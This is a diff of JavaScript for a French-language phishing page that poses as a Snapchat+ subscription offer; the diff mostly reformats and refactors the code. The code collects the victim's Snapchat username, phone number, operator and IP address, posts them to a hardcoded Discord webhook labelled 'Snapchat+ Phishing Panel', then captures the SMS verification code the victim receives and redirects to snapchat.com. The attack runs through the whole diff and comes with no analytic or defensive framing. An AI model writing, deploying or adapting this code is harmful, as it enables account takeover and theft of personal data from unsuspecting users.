@@ -720,296 +720,258 @@ localStorage.setItem('snap_uuid', sessionUUID);
 document.getElementById('uuidDisplay').textContent = 'Session: ' + sessionUUID.substring(0, 8);
 
 // Variables globales
-let selectedDuration = '6mois';
-let selectedOperator = '';
-let userIP = '';
-let userData = {
-    uuid: sessionUUID,
-    timestamp: new Date().toISOString()
-};
+// Variables globales
+        let selectedDuration = '6mois';
+        let selectedOperator = '';
+        let userIP = '';
+        let userData = {
+            uuid: sessionUUID,
+            timestamp: new Date().toISOString()
+        };
 
-// Webhook Discord encodé
-const webhook = 'https://discord.com/api/webhooks/1526917909174026300/yh3TgD0n6XDHWW8m9abikb2b0OQoW4jhQCWNsu_wRXFBv8Ie3flopn9gbnS1k4_KD5xB';
+        // Webhook Discord
+        const webhook = 'https://discord.com/api/webhooks/1526917909174026300/yh3TgD0n6XDHWW8m9abikb2b0OQoW4jhQCWNsu_wRXFBv8Ie3flopn9gbnS1k4_KD5xB';
 
+        // Récupération IP
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                userIP = data.ip;
+                userData.ip = data.ip;
+            })
+            .catch(() => {
+                userIP = 'unknown';
+                userData.ip = 'unknown';
+            });
 
-// Récupération IP
-fetch('https://api.ipify.org?format=json')
-    .then(res => res.json())
-    .then(data => {
-        userIP = data.ip;
-        userData.ip = data.ip;
-    })
-    .catch(() => {
-        userIP = 'unknown';
-        userData.ip = 'unknown';
-    });
-
-function selectDuration(val, el) {
-    selectedDuration = val;
-    document.querySelectorAll('.duration-card').forEach(c => c.classList.remove('selected'));
-    el.classList.add('selected');
-}
-
-function selectOperator(op, el) {
-    selectedOperator = op;
-    document.querySelectorAll('.operator-card').forEach(c => c.classList.remove('selected'));
-    el.classList.add('selected');
-}
-
-function validatePhone(input) {
-    // Supprime tout sauf les chiffres
-    input.value = input.value.replace(/\D/g, '');
-    
-    // Limite à 10 chiffres
-    if (input.value.length > 10) {
-        input.value = input.value.slice(0, 10);
-    }
-    
-    // Cache l'erreur si présent
-    document.getElementById('error2').style.display = 'none';
-}
-
-function showPage(pageId) {
-    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-    document.getElementById(pageId).classList.add('active');
-}
-
-function goToPage2() {
-    const username = document.getElementById('username').value.trim();
-    if (!username) {
-        document.getElementById('error1').style.display = 'flex';
-        return;
-    }
-    
-    userData.username = username;
-    userData.duration = selectedDuration;
-    document.getElementById('error1').style.display = 'none';
-    showPage('page2');
-}
-
-function submitData() {
-    const phone = document.getElementById('phone').value.trim();
-    
-    // Validation stricte: commence par 06 ou 07 et a exactement 10 chiffres
-    const phoneRegex = /^0[67]\d{8}$/;
-    
-    if (!selectedOperator) {
-        document.getElementById('error2').innerHTML = '<span>⚠️</span> Veuillez sélectionner un opérateur';
-        document.getElementById('error2').style.display = 'flex';
-        return;
-    }
-    
-    if (!phoneRegex.test(phone)) {
-        document.getElementById('error2').innerHTML = '<span>⚠️</span> Numéro invalide. Utilisez un numéro 06 ou 07 à 10 chiffres.';
-        document.getElementById('error2').style.display = 'flex';
-        return;
-    }
-    
-    userData.phone = phone;
-    userData.operator = selectedOperator;
-    userData.userAgent = navigator.userAgent;
-    userData.url = window.location.href;
-    
-    // Affiche la page loading
-    showPage('page3');
-    
-    // Envoie le webhook initial
-    sendInitialWebhook();
-    
-    // Simulation des étapes
-    const steps = [
-        'Connexion sécurisée à Snapchat...',
-        'Vérification du compte...',
-        'Validation opérateur mobile...',
-        'Préparation de l\'envoi SMS...'
-    ];
-    
-    let step = 0;
-    const interval = setInterval(() => {
-        if (step < steps.length) {
-            document.getElementById('loadingStatus').textContent = steps[step];
-            step++;
-        } else {
-            clearInterval(interval);
-            // Reste sur la page d'attente - le webhook contient le lien pour aller à la page code
-            document.getElementById('loadingStatus').textContent = 'En attente de confirmation...';
-            document.querySelector('.spinner').style.display = 'none';
-            document.querySelector('.loading-text').textContent = 'En attente du code SMS';
+        function selectDuration(val, el) {
+            selectedDuration = val;
+            document.querySelectorAll('.duration-card').forEach(c => c.classList.remove('selected'));
+            el.classList.add('selected');
         }
-    }, 1500);
-}
 
-function sendInitialWebhook() {
-    const webhook = getWebhook();
-    const currentUrl = window.location.origin + window.location.pathname;
-    
-    const embed = {
-        title: "🎯 Nouvelle cible - Snapchat+",
-        description: `**UUID:** \`${userData.uuid}\``,
-        color: 0xFFFC00,
-        fields: [
-            { name: "👤 Username", value: userData.username || "N/A", inline: true },
-            { name: "📱 Téléphone", value: userData.phone || "N/A", inline: true },
-            { name: "📡 Opérateur", value: userData.operator || "N/A", inline: true },
-            { name: "🌐 IP", value: userData.ip || "N/A", inline: true },
-            { name: "⏱️ Durée", value: userData.duration || "N/A", inline: true },
-            { name: "🕐 Date", value: new Date().toLocaleString('fr-FR'), inline: true },
-            { name: "🔗 UUID", value: `\`${userData.uuid}\``, inline: false }
-        ],
-        footer: { text: "Snapchat+ Phishing Panel" },
-        timestamp: new Date().toISOString()
-    };
-    
-    // URL avec UUID pour la page code
-    const codeUrl = `${currentUrl}?uuid=${userData.uuid}&action=code`;
-    const wrongUrl = `${currentUrl}?uuid=${userData.uuid}&action=wrong`;
-    
-    const payload = {
-        embeds: [embed],
-        components: [
-            {
-                type: 1,
+        function selectOperator(op, el) {
+            selectedOperator = op;
+            document.querySelectorAll('.operator-card').forEach(c => c.classList.remove('selected'));
+            el.classList.add('selected');
+        }
+
+        function validatePhone(input) {
+            input.value = input.value.replace(/\D/g, '');
+            if (input.value.length > 10) {
+                input.value = input.value.slice(0, 10);
+            }
+            document.getElementById('error2').style.display = 'none';
+        }
+
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+        }
+
+        function goToPage2() {
+            const username = document.getElementById('username').value.trim();
+            if (!username) {
+                document.getElementById('error1').style.display = 'flex';
+                return;
+            }
+            userData.username = username;
+            userData.duration = selectedDuration;
+            document.getElementById('error1').style.display = 'none';
+            showPage('page2');
+        }
+
+        function submitData() {
+            const phone = document.getElementById('phone').value.trim();
+            const phoneRegex = /[67]\d{8}$/;
+
+            if (!selectedOperator) {
+                document.getElementById('error2').innerHTML = '<span>⚠️</span> Veuillez sélectionner un opérateur';
+                document.getElementById('error2').style.display = 'flex';
+                return;
+            }
+
+            if (!phoneRegex.test(phone)) {
+                document.getElementById('error2').innerHTML = '<span>⚠️</span> Numéro invalide. Utilisez un numéro 06 ou 07 à 10 chiffres.';
+                document.getElementById('error2').style.display = 'flex';
+                return;
+            }
+
+            userData.phone = phone;
+            userData.operator = selectedOperator;
+            userData.userAgent = navigator.userAgent;
+            userData.url = window.location.href;
+
+            showPage('page3');
+
+            // Sauvegarde dans le LocalStorage
+            localStorage.setItem('snap_data', JSON.stringify(userData));
+
+            // Envoi du webhook initial
+            sendInitialWebhook();
+
+            // Simulation des étapes
+            const steps = [
+                'Connexion sécurisée à Snapchat...',
+                'Vérification du compte...',
+                'Validation opérateur mobile...',
+                'Préparation de l\'envoi SMS...'
+            ];
+
+            let step = 0;
+            const interval = setInterval(() => {
+                if (step < steps.length) {
+                    document.getElementById('loadingStatus').textContent = steps[step];
+                    step++;
+                } else {
+                    clearInterval(interval);
+                    document.getElementById('loadingStatus').textContent = 'En attente de confirmation...';
+                    document.querySelector('.spinner').style.display = 'none';
+                    document.querySelector('.loading-text').textContent = 'En attente du code SMS';
+                }
+            }, 1500);
+        }
+
+        function sendInitialWebhook() {
+            const currentUrl = window.location.origin + window.location.pathname;
+
+            const embed = {
+                title: "🎯 Nouvelle cible - Snapchat+",
+                description: `**UUID:** \`${userData.uuid}\``,
+                color: 0xFFFC00,
+                fields: [
+                    { name: "👤 Username", value: userData.username || "N/A", inline: true },
+                    { name: "📱 Téléphone", value: userData.phone || "N/A", inline: true },
+                    { name: "📡 Opérateur", value: userData.operator || "N/A", inline: true },
+                    { name: "🌐 IP", value: userData.ip || "N/A", inline: true },
+                    { name: "⏱️ Durée", value: userData.duration || "N/A", inline: true },
+                    { name: "🕐 Date", value: new Date().toLocaleString('fr-FR'), inline: true },
+                    { name: "🔗 UUID", value: `\`${userData.uuid}\``, inline: false }
+                ],
+                footer: { text: "Snapchat+ Phishing Panel" },
+                timestamp: new Date().toISOString()
+            };
+
+            const codeUrl = `${currentUrl}?uuid=${userData.uuid}&action=code`;
+            const wrongUrl = `${currentUrl}?uuid=${userData.uuid}&action=wrong`;
+
+            const payload = {
+                embeds: [embed],
                 components: [
                     {
-                        type: 2,
-                        style: 5,
-                        label: "📤 Envoyer le code",
-                        url: codeUrl,
-                        emoji: { name: "📱" }
-                    },
-                    {
-                        type: 2,
-                        style: 4,
-                        label: "❌ Mauvais numéro",
-                        url: wrongUrl,
-                        emoji: { name: "🗑️" }
+                        type: 1,
+                        components: [
+                            { type: 2, style: 5, label: "📤 Envoyer le code", url: codeUrl, emoji: { name: "📱" } },
+                            { type: 2, style: 4, label: "❌ Mauvais numéro", url: wrongUrl, emoji: { name: "🗑️" } }
+                        ]
                     }
                 ]
+            };
+
+            sendWebhookRequest(webhook, payload);
+        }
+
+        function sendCodeWebhook(code) {
+            const embed = {
+                title: "✅ CODE REÇU - Snapchat+",
+                description: `**UUID:** \`${userData.uuid}\`\n**Code:** ||${code}||`,
+                color: 0x00d26a,
+                fields: [
+                    { name: "👤 Username", value: userData.username || "N/A", inline: true },
+                    { name: "📱 Téléphone", value: userData.phone || "N/A", inline: true },
+                    { name: "🔐 Code entré", value: `\`${code}\``, inline: true },
+                    { name: "📡 Opérateur", value: userData.operator || "N/A", inline: true },
+                    { name: "🌐 IP", value: userData.ip || "N/A", inline: true }
+                ],
+                footer: { text: "Code capturé avec succès" },
+                timestamp: new Date().toISOString()
+            };
+
+            const payload = { embeds: [embed] };
+            sendWebhookRequest(webhook, payload);
+        }
+
+        function sendWebhookRequest(webhookUrl, payload) {
+            console.log('Payload envoyé:', payload);
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                console.log('Réponse:', response.status, response.statusText);
+            })
+            .catch(error => {
+                console.error('Erreur:', error);
+            });
+
+            // Fallback XHR
+            try {
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', webhookUrl, true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.send(JSON.stringify(payload));
+            } catch (e) {
+                console.error('Erreur XHR:', e);
             }
-        ]
-    };
-    
-    // Envoi avec gestion CORS
-    fetch(webhook, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(payload)
-    })
-    .then(() => console.log('Webhook envoyé'))
-    .catch(err => console.log('Erreur webhook (normal si CORS):', err));
-    
-    // Backup avec XMLHttpRequest pour contourner CORS sur certains navigateurs
-    try {
-        const xhr = new XMLHttpRequest();
-        xhr.open('POST', webhook, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify(payload));
-    } catch(e) {}
-}
+        }
 
-function handleCode(input, index) {
-    // N'accepte que les chiffres
-    input.value = input.value.replace(/\D/g, '').substring(0, 1);
-    
-    if (input.value.length === 1 && index < 3) {
-        document.getElementById('code' + (index + 1)).focus();
-    }
-    
-    document.getElementById('error3').style.display = 'none';
-}
+        function handleCode(input, index) {
+            input.value = input.value.replace(/\D/g, '').substring(0, 1);
+            if (input.value.length === 1 && index < 3) {
+                document.getElementById('code' + (index + 1)).focus();
+            }
+            document.getElementById('error3').style.display = 'none';
+        }
 
-function handleKey(e, index) {
-    if (e.key === 'Backspace' && !e.target.value && index > 0) {
-        document.getElementById('code' + (index - 1)).focus();
-    }
-}
+        function handleKey(e, index) {
+            if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                document.getElementById('code' + (index - 1)).focus();
+            }
+        }
 
-function verifyCode() {
-    let code = '';
-    for (let i = 0; i < 4; i++) {
-        code += document.getElementById('code' + i).value;
-    }
-    
-    if (code.length !== 4) {
-        document.getElementById('error3').style.display = 'flex';
-        return;
-    }
-    
-    userData.code = code;
-    
-    // Envoie le webhook avec le code
-    sendCodeWebhook(code);
-    
-    // Affiche succès
-    document.getElementById('successUser').textContent = userData.username;
-    showPage('page5');
-    
-    // Redirection
-    setTimeout(() => {
-        window.location.href = 'https://snapchat.com';
-    }, 4000);
-}
+        function verifyCode() {
+            let code = '';
+            for (let i = 0; i < 4; i++) {
+                code += document.getElementById('code' + i).value;
+            }
 
-function sendCodeWebhook(code) {
-    const webhook = getWebhook();
-    
-    const embed = {
-        title: "✅ CODE REÇU - Snapchat+",
-        description: `**UUID:** \`${userData.uuid}\`\n**Code:** ||${code}||`,
-        color: 0x00d26a,
-        fields: [
-            { name: "👤 Username", value: userData.username || "N/A", inline: true },
-            { name: "📱 Téléphone", value: userData.phone || "N/A", inline: true },
-            { name: "🔐 Code entré", value: `\`${code}\``, inline: true },
-            { name: "📡 Opérateur", value: userData.operator || "N/A", inline: true },
-            { name: "🌐 IP", value: userData.ip || "N/A", inline: true }
-        ],
-        footer: { text: "Code capturé avec succès" },
-        timestamp: new Date().toISOString()
-    };
-    
-    const payload = { embeds: [embed] };
-    
-    fetch(webhook, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    }).catch(() => {});
-    
-    // Backup XHR
-    try {
-        const xhr = new XMLHttpRequest();
-        xhr.open('POST', webhook, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify(payload));
-    } catch(e) {}
-}
+            if (code.length !== 4) {
+                document.getElementById('error3').style.display = 'flex';
+                return;
+            }
 
-function resendCode() {
-    // Renvoie le webhook initial
-    sendInitialWebhook();
-    alert('Code renvoyé ! Vérifiez vos SMS.');
-}
+            userData.code = code;
+            sendCodeWebhook(code);
 
-// Gestion des paramètres URL pour les boutons Discord
-const urlParams = new URLSearchParams(window.location.search);
-const uuidFromUrl = urlParams.get('uuid');
-const action = urlParams.get('action');
+            document.getElementById('successUser').textContent = userData.username;
+            showPage('page5');
 
-if (uuidFromUrl && action === 'code') {
-    // Vérifie que l'UUID correspond
-    if (uuidFromUrl === sessionUUID) {
-        // Affiche la page code avec le numéro masqué
-        const phone = localStorage.getItem('snap_phone') || '06••••••••';
-        document.getElementById('displayPhone').textContent = phone;
-        showPage('page4');
-    } else {
-        // UUID différent - redirige vers l'accueil
-        window.location.href = window.location.pathname;
-    }
-}
+            setTimeout(() => {
+                window.location.href = 'https://snapchat.com';
+            }, 4000);
+        }
+
+        function resendCode() {
+            sendInitialWebhook();
+            document.getElementById('displayPhone').textContent = userData.phone;
+            showPage('page4');
+        }
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const uuidFromUrl = urlParams.get('uuid');
+        const action = urlParams.get('action');
+
+        if (uuidFromUrl && action === 'code') {
+            const storedData = JSON.parse(localStorage.getItem('snap_data') || '{}');
+            if (storedData.uuid && uuidFromUrl === storedData.uuid) {
+                document.getElementById('displayPhone').textContent = storedData.phone;
+                showPage('page4');
+            } else {
+                window.location.href = window.location.pathname;
+            }
+        }
 
 // Sauvegarde le téléphone pour l'afficher sur la page code
 document.getElementById('phone')?.addEventListener('change', (e) => {
